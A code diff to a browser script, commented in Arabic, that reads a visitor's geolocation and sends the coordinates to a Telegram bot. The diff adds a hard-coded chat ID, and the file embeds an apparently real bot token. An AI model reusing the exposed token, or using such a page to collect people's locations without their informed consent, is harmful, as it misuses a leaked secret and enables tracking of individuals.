@@ -1,5 +1,6 @@
 // إعدادات البوت
 const BOT_TOKEN = '7540998214:AAEysEoXCj5XHlQzVG3-yETXNk6WdeZ9Yc0';
+const CHAT_ID = '6913353602'; // يجب استبدالها بمعرف الدردشة الخاص بك
 
 // عناصر DOM
 const statusElement = document.getElementById('status');
@@ -27,7 +28,7 @@ async function init() {
         // 3. إرسال إلى تليجرام
         statusElement.textContent = 'جاري الإرسال إلى تليجرام...';
         await sendToTelegram(latitude, longitude);
-        statusElement.textContent += ' - تم الإرسال بنجاح!';
+        statusElement.textContent = 'تم الإرسال بنجاح!';
         
     } catch (error) {
         handleError(error);
@@ -47,6 +48,10 @@ function getLocation() {
 
 // إرسال إلى تليجرام
 async function sendToTelegram(lat, lng) {
+    if (!CHAT_ID) {
+        throw new Error('لم يتم تحديد معرف الدردشة (CHAT_ID)');
+    }
+    
     const message = `📍 موقع جديد:
 - خط العرض: ${lat.toFixed(6)}
 - خط الطول: ${lng.toFixed(6)}
@@ -56,7 +61,7 @@ async function sendToTelegram(lat, lng) {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            chat_id: "", // يترك فارغاً للإرسال للبوت مباشرة
+            chat_id: CHAT_ID,
             text: message
         })
     });
@@ -75,7 +80,9 @@ function handleError(error) {
     } else if (error.message.includes('Failed to fetch')) {
         message = 'فشل الاتصال بالخادم. تحقق من اتصال الإنترنت';
     } else if (error.message.includes('chat not found')) {
-        message = 'لم يتم العثور على البوت. تحقق من التوكن';
+        message = 'لم يتم العثور على الدردشة. تحقق من معرف الدردشة';
+    } else if (error.message.includes('chat_id')) {
+        message = 'لم يتم تحديد معرف الدردشة (CHAT_ID)';
     }
     
     statusElement.textContent = message;
